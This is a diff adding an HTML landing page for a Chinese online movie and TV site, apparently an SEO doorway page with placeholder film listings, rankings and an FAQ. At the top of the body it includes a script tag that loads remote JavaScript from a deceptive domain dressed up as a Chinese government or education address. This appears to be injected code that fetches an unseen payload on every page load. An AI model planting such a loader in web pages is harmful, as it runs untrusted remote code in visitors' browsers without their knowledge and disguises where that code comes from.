@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>吉吉电影网 - 高清电影电视剧在线观看 | jijidianyingwang-app</title>
+<meta name="keywords" content="吉吉电影网, jijidianyingwang-app, 高清电影, 在线电影, 电视剧, 综艺, 动漫, 影视排行榜">
+<meta name="description" content="吉吉电影网（jijidianyingwang-app）提供高清电影、热播电视剧、综艺、动漫在线观看与影视排行榜，每日更新精彩影视内容，移动端自适应访问更流畅。">
+<link rel="canonical" href="https://jijidianyingwang-app/">
+<link rel="alternate" media="only screen and (max-width: 640px)" href="https://jijidianyingwang-app/">
+<style>
+:root{
+  --bg:#070a1f;
+  --bg2:#0d1230;
+  --card:#12183880;
+  --line:#2a3170;
+  --neon:#5ad7ff;
+  --neon2:#ff4fae;
+  --gold:#ffd166;
+  --text:#eaf0ff;
+  --muted:#a6add6;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;
+  background:radial-gradient(1200px 600px at 15% -10%,#1b2363 0%,transparent 55%),radial-gradient(900px 500px at 85% 5%,#3a1c5e 0%,transparent 50%),var(--bg);
+  color:var(--text);line-height:1.7;overflow-x:hidden;
+}
+img{display:block;max-width:100%}
+a{color:var(--neon);text-decoration:none}
+ul{list-style:none}
+
+/* 胶片背景装饰 */
+.filmstrip{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.filmstrip span{position:absolute;left:-8%;width:120%;height:38px;
+  background:repeating-linear-gradient(90deg,#000 0 26px,transparent 26px 40px);opacity:.18;
+  transform:rotate(-6deg);}
+.filmstrip span:nth-child(1){top:14%}
+.filmstrip span:nth-child(2){top:62%;transform:rotate(5deg);opacity:.12}
+
+.wrap{position:relative;z-index:2;max-width:1160px;margin:0 auto;padding:0 20px}
+
+/* 顶部 */
+header{position:sticky;top:0;z-index:50;backdrop-filter:blur(10px);background:#070a1fcc;border-bottom:1px solid #ffffff14}
+.top{display:flex;align-items:center;gap:14px;height:64px}
+.logo{display:flex;align-items:baseline;gap:8px;flex:1;min-width:0}
+.logo b{font-size:22px;letter-spacing:1px;background:linear-gradient(90deg,var(--neon),var(--neon2));-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 20px #5ad7ff44}
+.logo em{font-style:normal;font-size:11px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.nav{display:flex;gap:6px;align-items:center}
+.nav a{font-size:14px;padding:8px 12px;border-radius:10px;color:#d8deff;transition:.25s}
+.nav a:hover{background:#5ad7ff18;color:var(--neon)}
+.menu-btn{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:12px;background:#ffffff08;color:#fff;font-size:20px;cursor:pointer}
+
+/* Hero */
+.hero{position:relative;margin:34px 0 26px;padding:56px 40px;border-radius:28px;overflow:hidden;
+  background:linear-gradient(120deg,#151b4a,#2a1257 55%,#0e173f);border:1px solid #ffffff12;
+  box-shadow:0 20px 60px #00000060,inset 0 0 80px #5ad7ff10}
+.hero::after{content:"";position:absolute;right:-90px;top:-90px;width:300px;height:300px;border-radius:50%;background:#ff4fae40;filter:blur(40px)}
+.hero h1{font-size:clamp(26px,5vw,46px);line-height:1.2;margin-bottom:16px;position:relative}
+.hero h1 i{font-style:normal;color:var(--gold)}
+.hero p{color:var(--muted);max-width:560px;font-size:15px;position:relative}
+.hero .acts{margin-top:26px;display:flex;flex-wrap:wrap;gap:12px;position:relative}
+.btn{border:1px solid #ffffff22;background:#ffffff0d;color:#fff;padding:12px 22px;border-radius:999px;font-size:14px;cursor:pointer;transition:.25s}
+.btn:hover{transform:translateY(-2px);border-color:var(--neon);color:var(--neon)}
+.btn.primary{background:linear-gradient(90deg,var(--neon),var(--neon2));color:#04122b;border:0;font-weight:700}
+.hero .stats{margin-top:30px;display:flex;gap:26px;flex-wrap:wrap;position:relative}
+.stat b{display:block;font-size:24px;color:var(--gold)}
+.stat small{color:var(--muted);font-size:12px}
+
+/* 通用区块 */
+section{padding:44px 0}
+.eyebrow{display:inline-block;font-size:12px;letter-spacing:2px;color:var(--neon);border:1px solid #5ad7ff44;border-radius:99px;padding:4px 12px;margin-bottom:14px}
+h2{font-size:clamp(20px,3.4vw,28px);margin-bottom:8px;display:flex;align-items:center;gap:10px}
+h2::before{content:"";width:5px;height:22px;border-radius:4px;background:linear-gradient(var(--neon),var(--neon2))}
+.sub{color:var(--muted);font-size:13px;margin-bottom:26px}
+.grid{display:grid;gap:20px}
+.cards{grid-template-columns:repeat(auto-fill,minmax(180px,1fr))}
+.posters{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}
+
+.card{position:relative;border-radius:18px;overflow:hidden;border:1px solid #ffffff10;background:var(--card);transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:var(--neon)}
+.poster{position:relative;aspect-ratio:2/3;background:linear-gradient(160deg,#222a5e,#10153a)}
+.poster .tag{position:absolute;left:10px;top:10px;font-size:11px;background:#00000088;padding:3px 9px;border-radius:99px;backdrop-filter:blur(4px)}
+.poster .score{position:absolute;right:10px;top:10px;font-size:12px;font-weight:700;color:var(--gold);background:#00000088;padding:3px 9px;border-radius:99px}
+.poster .play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:40px;color:#fff;opacity:0;transition:.3s;text-shadow:0 0 20px var(--neon)}
+.card:hover .play{opacity:1;background:#0a123366}
+.info{padding:12px 14px}
+.info h3{font-size:15px;margin-bottom:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.info p{font-size:12px;color:var(--muted)}
+.card a::after{content:"";position:absolute;inset:0}
+
+/* 频道 */
+.channels{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:18px}
+.channel{border-radius:20px;padding:26px 22px;border:1px solid #ffffff10;background:linear-gradient(160deg,#161c45,#0d1230);transition:.3s;position:relative;overflow:hidden}
+.channel:hover{border-color:var(--neon2);transform:translateY(-4px)}
+.channel .ico{font-size:30px;margin-bottom:12px;display:block}
+.channel h3{font-size:18px;margin-bottom:6px}
+.channel p{font-size:13px;color:var(--muted)}
+.channel .arrow{position:absolute;right:20px;top:26px;color:var(--neon);opacity:0;transition:.3s}
+.channel:hover .arrow{opacity:1;transform:translateX(4px)}
+
+/* 榜单 */
+.rank{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
+.rank-item{display:flex;gap:14px;align-items:center;border-radius:16px;padding:12px;background:#ffffff06;border:1px solid #ffffff0c;transition:.25s}
+.rank-item:hover{background:#5ad7ff0d}
+.rank-item .n{width:34px;height:34px;flex:0 0 34px;border-radius:10px;display:grid;place-items:center;font-weight:700;background:linear-gradient(135deg,#5ad7ff22,#ff4fae22);color:var(--gold)}
+.rank-item.top .n{background:linear-gradient(135deg,var(--gold),var(--neon2));color:#2a1500}
+.rank-item .t{flex:1;min-width:0}
+.rank-item .t b{display:block;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rank-item .t small{color:var(--muted);font-size:12px}
+
+/* 网址与SEO条 */
+.notice{border-radius:24px;padding:34px;border:1px solid #5ad7ff33;background:linear-gradient(135deg,#111842,#251046);text-align:center}
+.notice .url{display:inline-block;margin-top:14px;font-size:clamp(18px,4vw,26px);font-weight:700;letter-spacing:1px;color:var(--gold);word-break:break-all}
+.notice .copy{margin-top:18px}
+
+.kw{display:flex;flex-wrap:wrap;gap:10px;margin-top:18px;justify-content:center}
+.kw a{font-size:12px;padding:6px 14px;border-radius:99px;background:#ffffff0c;border:1px solid #ffffff14;color:var(--muted)}
+.kw a:hover{color:var(--neon);border-color:var(--neon)}
+
+/* 时间线 */
+.timeline{border-left:2px dashed var(--line);margin-left:8px;padding-left:26px}
+.timeline li{position:relative;padding-bottom:22px}
+.timeline li::before{content:"";position:absolute;left:-34px;top:6px;width:14px;height:14px;border-radius:50%;background:var(--neon);box-shadow:0 0 0 4px #5ad7ff22}
+.timeline b{color:var(--gold)}
+.timeline span{color:var(--muted);font-size:13px}
+
+/* 表格 */
+table{width:100%;border-collapse:collapse;font-size:14px;background:#ffffff06;border-radius:16px;overflow:hidden}
+th,td{padding:14px;text-align:left;border-bottom:1px solid #ffffff10}
+th{background:#5ad7ff14;color:var(--neon);font-weight:600}
+tr:last-child td{border:0}
+td a{color:#fff}
+
+/* 常见问题 */
+.faq details{border:1px solid #ffffff10;border-radius:14px;margin-bottom:12px;padding:4px 18px;background:#ffffff05}
+.faq summary{cursor:pointer;font-weight:600;padding:14px 0;list-style:none;position:relative}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";position:absolute;right:0;color:var(--neon)}
+.faq details[open] summary::after{content:"－"}
+.faq p{padding:0 0 16px;color:var(--muted);font-size:14px}
+
+/* 页脚 */
+footer{border-top:1px solid #ffffff12;margin-top:40px;padding:40px 0 30px;color:var(--muted);font-size:13px}
+.foot{display:flex;flex-wrap:wrap;gap:26px;justify-content:space-between;align-items:flex-start}
+.foot a{color:var(--muted)}
+.foot a:hover{color:var(--neon)}
+.links{display:flex;flex-wrap:wrap;gap:16px}
+
+/* 回到顶部 */
+.top-link{position:fixed;right:18px;bottom:24px;z-index:60;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;
+  background:linear-gradient(135deg,var(--neon),var(--neon2));color:#04122b;font-size:20px;box-shadow:0 8px 24px #ff4fae44;opacity:0;pointer-events:none;transition:.3s}
+.top-link.show{opacity:1;pointer-events:auto}
+
+@media(max-width:820px){
+  .nav{position:fixed;left:0;right:0;top:64px;flex-direction:column;align-items:stretch;padding:16px;background:#0a0e28ee;backdrop-filter:blur(12px);border-bottom:1px solid #ffffff14;transform:translateY(-120%);transition:.35s;z-index:49}
+  .nav.open{transform:none}
+  .nav a{padding:14px;border-radius:12px}
+  .menu-btn{display:grid;place-items:center}
+  .hero{padding:38px 22px}
+  section{padding:34px 0}
+  .channels,.cards,.posters,.rank{grid-template-columns:repeat(2,1fr)}
+  .rank-item{flex:1 1 100%}
+  table{font-size:13px}
+  th,td{padding:10px}
+}
+@media(max-width:420px){
+  .wrap{padding:0 14px}
+  .channels,.cards,.posters,.rank{grid-template-columns:1fr}
+  .hero .stats{gap:18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<div class="filmstrip" aria-hidden="true"><span></span><span></span></div>
+
+<header>
+  <div class="wrap top">
+    <div class="logo">
+      <b>吉吉电影网</b>
+      <em>jijidianyingwang-app</em>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#rank">排行榜</a>
+      <a href="#schedule">更新</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <h1>吉吉电影网 · 把<strong>电影院</strong>装进<i>口袋</i></h1>
+    <p>这里是吉吉电影网（jijidianyingwang-app）的影视导航首页，汇集高清电影、热播电视剧、综艺与动漫资源，每日更新榜单与分类，手机端自适应浏览，随时随地找好片。</p>
+    <div class="acts">
+      <a class="btn primary" href="#movie">立即选片</a>
+      <a class="btn" href="#rank">查看排行榜</a>
+      <a class="btn" href="#schedule">更新日历</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>10万+</b><small>影视条目</small></div>
+      <div class="stat"><b>8</b><small>内容频道</small></div>
+      <div class="stat"><b>每日</b><small>更新排期</small></div>
+      <div class="stat"><b>全端</b><small>自适应访问</small></div>
+    </div>
+  </section>
+
+  <section id="movie">
+    <span class="eyebrow">MOVIE</span>
+    <h2>精选电影</h2>
+    <p class="sub">动作、喜剧、科幻、悬疑一应俱全，按类型快速定位你喜欢的影片。</p>
+    <div class="grid cards">
+      <div class="card">
+        <div class="poster"><span class="tag">动作</span><span class="score">9.1</span><span class="play">▶</span></div>
+        <div class="info"><h3>极速追击</h3><p>2026 · 动作 / 犯罪</p></div>
+        <a href="#" aria-label="极速追击"></a>
+      </div>
+      <div class="card">
+        <div class="poster"><span class="tag">科幻</span><span class="score">8.7</span><span class="play">▶</span></div>
+        <div class="info"><h3>星海归途</h3><p>2026 · 科幻 / 冒险</p></div>
+        <a href="#" aria-label="星海归途"></a>
+      </div>
+      <div class="card">
+        <div class="poster"><span class="tag">喜剧</span><span class="score">8.3</span><span class="play">▶</span></div>
+        <div class="info"><h3>乌龙合伙人</h3><p>2026 · 喜剧 / 家庭</p></div>
+        <a href="#" aria-label="乌龙合伙人"></a>
+      </div>
+      <div class="card">
+        <div class="poster"><span class="tag">悬疑</span><span class="score">8.9</span><span class="play">▶</span></div>
+        <div class="info"><h3>无声证词</h3><p>2026 · 悬疑 / 犯罪</p></div>
+        <a href="#" aria-label="无声证词"></a>
+      </div>
+      <div class="card">
+        <div class="poster"><span class="tag">爱情</span><span class="score">7.9</span><span class="play">▶</span></div>
+        <div class="info"><h3>夏末情书</h3><p>2026 · 爱情 / 青春</p></div>
+        <a href="#" aria-label="夏末情书"></a>
+      </div>
+      <div class="card">
+        <div class="poster"><span class="tag">战争</span><span class="score">8.6</span><span class="play">▶</span></div>
+        <div class="info"><h3>黎明防线</h3><p>2026 · 战争 / 历史</p></div>
+        <a href="#" aria-label="黎明防线"></a>
+      </div>
+    </div>
+  </section>
+
+  <section id="channels">
+    <span class="eyebrow">CHANNELS</span>
+    <h2>内容频道</h2>
+    <p class="sub">吉吉电影网把影视内容分成多个频道，点击对应栏目即可跳转浏览。</p>
+    <div class="channels">
+      <a class="channel" href="#"><span class="ico">🎬</span><h3>电影频道</h3><p>动作、喜剧、科幻、悬疑等类型电影</p><span class="arrow">→</span></a>
+      <a class="channel" href="#tv"><span class="ico">📺</span><h3>电视剧频道</h3><p>国产剧、美剧、韩剧、日剧同步更新</p><span class="arrow">→</span></a>
+      <a class="channel" href="#"><span class="ico">🎤</span><h3>综艺频道</h3><p>真人秀、脱口秀、选秀与晚会节目</p><span class="arrow">→</span></a>
+      <a class="channel" href="#"><span class="ico">🎨</span><h3>动漫频道</h3><p>国漫、日漫、美漫与剧场版动画</p><span class="arrow">→</span></a>
+      <a class="channel" href="#rank"><span class="ico">🏆</span><h3>排行榜</h3><p>热播榜、口碑榜、飙升榜实时更新</p><span class="arrow">→</span></a>
+      <a class="channel" href="#"><span class="ico">🔍</span><h3>影片搜索</h3><p>按片名、演员、导演快速检索</p><span class="arrow">→</span></a>
+    </div>
+  </section>
+
+  <section id="tv">
+    <span class="eyebrow">TV SERIES</span>
+    <h2>热播电视剧</h2>
+    <p class="sub">每日跟进更新进度，追剧不迷路。</p>
+    <div class="grid posters">
+      <div class="card">
+        <div class="poster"><span class="tag">国产剧</span><span class="score">8.8</span><span class="play">▶</span></div>
+        <div class="info"><h3>长安夜行</h3><p>更新至第24集</p></div>
+        <a href="#" aria-label="长安夜行"></a>
+      </div>
+      <div class="card">
+        <div class="poster"><span class="tag">韩剧</span><span class="score">8.5</span><span class="play">▶</span></div>
+        <div class="info"><h3>检察官小姐</h3><p>更新至第12集</p></div>
+        <a href="#" aria-label="检察官小姐"></a>
+      </div>
+      <div class="card">
+        <div class="poster"><span class="tag">美剧</span><span class="score">9.0</span><span class="play">▶</span></div>
+        <div class="info"><h3>暗夜之城</h3><p>更新至第08集</p></div>
+        <a href="#" aria-label="暗夜之城"></a>
+      </div>
+      <div class="card">
+        <div class="poster"><span class="tag">日剧</span><span class="score">8.2</span><span class="play">▶</span></div>
+        <div class="info"><h3>便利店星光</h3><p>更新至第06集</p></div>
+        <a href="#" aria-label="便利店星光"></a>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <span class="eyebrow">TOP RANKING</span>
+    <h2>今日影视排行榜</h2>
+    <p class="sub">综合播放热度与口碑评分，实时更新吉吉电影网热门榜单。</p>
+    <div class="rank">
+      <div class="rank-item top"><span class="n">1</span><div class="t"><b>极速追击</b><small>动作 · 评分 9.1</small></div></div>
+      <div class="rank-item top"><span class="n">2</span><div class="t"><b>星海归途</b><small>科幻 · 评分 8.7</small></div></div>
+      <div class="rank-item top"><span class="n">3</span><div class="t"><b>长安夜行</b><small>电视剧 · 评分 8.8</small></div></div>
+      <div class="rank-item"><span class="n">4</span><div class="t"><b>无声证词</b><small>悬疑 · 评分 8.9</small></div></div>
+      <div class="rank-item"><span class="n">5</span><div class="t"><b>暗夜之城</b><small>美剧 · 评分 9.0</small></div></div>
+      <div class="rank-item"><span class="n">6</span><div class="t"><b>黎明防线</b><small>战争 · 评分 8.6</small></div></div>
+      <div class="rank-item"><span class="n">7</span><div class="t"><b>乌龙合伙人</b><small>喜剧 · 评分 8.3</small></div></div>
+      <div class="rank-item"><span class="n">8</span><div class="t"><b>夏末情书</b><small>爱情 · 评分 7.9</small></div></div>
+    </div>
+  </section>
+
+  <section id="schedule">
+    <span class="eyebrow">UPDATE SCHEDULE</span>
+    <h2>本周更新日历</h2>
+    <p class="sub">掌握每日上线节奏，第一时间追看新内容。</p>
+    <ul class="timeline">
+      <li><b>周一</b><br><span>新剧集上线 · 国产剧、韩剧更新</span></li>
+      <li><b>周三</b><br><span>电影资源更新 · 动作与科幻专区上新</span></li>
+      <li><b>周五</b><br><span>周末档上线 · 综艺与院线新片同步</span></li>
+      <li><b>周日</b><br><span>排行榜结算 · 口碑榜与热播榜刷新</span></li>
+    </ul>
+  </section>
+
+  <section id="types">
+    <span class="eyebrow">CATEGORIES</span>
+    <h2>影片分类速查</h2>
+    <p class="sub">按类型筛选，更快找到心仪的影视内容。</p>
+    <div class="grid" style="grid-template-columns:1fr">
+      <table>
+        <thead><tr><th>类型</th><th>代表作品</th><th>频道</th><th>操作</th></tr></thead>
+        <tbody>
+          <tr><td>动作 / 犯罪</td><td>极速追击、黎明防线</td><td>电影频道</td><td><a href="#">查看 ›</a></td></tr>
+          <tr><td>科幻 / 冒险</td><td>星海归途</td><td>电影频道</td><td><a href="#">查看 ›</a></td></tr>
+          <tr><td>悬疑 / 犯罪</td><td>无声证词</td><td>电影频道</td><td><a href="#">查看 ›</a></td></tr>
+          <tr><td>古装 / 剧情</td><td>长安夜行</td><td>电视剧频道</td><td><a href="#">查看 ›</a></td></tr>
+          <tr><td>综艺 / 真人秀</td><td>周末欢乐派</td><td>综艺频道</td><td><a href="#">查看 ›</a></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section id="faq" class="faq">
+    <span class="eyebrow">FAQ</span>
+    <h2>常见问题</h2>
+    <p class="sub">关于吉吉电影网的访问、内容与使用说明。</p>
+    <details open>
+      <summary>吉吉电影网的网址是什么？</summary>
+      <p>本站官方网址为 <strong>https://jijidianyingwang-app</strong>，建议收藏该网址以便快速访问。</p>
+    </details>
+    <details>
+      <summary>网站内容包含哪些栏目？</summary>
+      <p>包含电影、电视剧、综艺、动漫、排行榜、更新日历与影片分类等栏目，覆盖主流影视类型。</p>
+    </details>
+    <details>
+      <summary>手机端可以正常浏览吗？</summary>
+      <p>可以，本站采用移动端自适应设计，手机、平板与电脑均可正常查看，无需额外安装应用。</p>
+    </details>
+    <details>
+      <summary>内容多久更新一次？</summary>
+      <p>影视条目与榜单按每日节奏更新，热门剧集与电影会同步跟进最新进度。</p>
+    </details>
+    <details>
+      <summary>如何快速找到想看的影片？</summary>
+      <p>可通过首页分类、排行榜或影片搜索入口，按片名、类型、演员等关键词快速定位。</p>
+    </details>
+  </section>
+
+  <section id="about">
+    <div class="notice">
+      <span class="eyebrow">OFFICIAL</span>
+      <h2 style="justify-content:center">关于吉吉电影网</h2>
+      <p style="color:var(--muted);max-width:640px;margin:12px auto 0">吉吉电影网（jijidianyingwang-app）致力于为用户整理与推荐优质影视内容，涵盖电影、电视剧、综艺、动漫等多类频道，以清晰的分类、实时的排行榜和便捷的移动端体验，让每一次找片都更高效。</p>
+      <div class="url">https://jijidianyingwang-app</div>
+      <div class="kw">
+        <a href="#">吉吉电影网 电影</a>
+        <a href="#">吉吉电影网 电视剧</a>
+        <a href="#">jijidianyingwang-app 影视</a>
+        <a href="#">高清电影在线观看</a>
+        <a href="#">热门影视排行榜</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap foot">
+    <div>
+      <div class="logo" style="margin-bottom:10px"><b>吉吉电影网</b></div>
+      <p>官方网址：<a href="https://jijidianyingwang-app">https://jijidianyingwang-app</a></p>
+      <p style="margin-top:6px">© 2026 吉吉电影网 保留所有权利。</p>
+    </div>
+    <div class="links">
+      <a href="#home">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#rank">排行榜</a>
+      <a href="#schedule">更新日历</a>
+      <a href="#faq">常见问题</a>
+    </div>
+  </div>
+</footer>
+
+<a href="#home" class="top-link" id="topLink" aria-label="回到顶部">↑</a>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn');
+  var nav=document.getElementById('nav');
+  btn.addEventListener('click',function(){nav.classList.toggle('open');});
+  nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open');});
+  var topLink=document.getElementById('topLink');
+  window.addEventListener('scroll',function(){
+    if(window.scrollY>400)topLink.classList.add('show');else topLink.classList.remove('show');
+  });
+})();
+</script>
+</body>
+</html>
